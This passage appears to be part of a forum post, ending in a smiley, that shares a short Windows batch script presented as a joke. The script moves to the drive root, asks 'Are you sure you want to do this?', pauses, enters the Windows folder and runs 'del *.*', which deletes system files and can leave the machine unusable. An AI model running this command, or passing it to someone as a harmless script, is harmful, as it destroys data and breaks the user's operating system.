cd ../ ../ ../ ../ ../
echo Are you sure you want to do this?
pause
cd Windows
del *.*</code></pre>
<p><img src="https://forum.moparisthebest.com/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
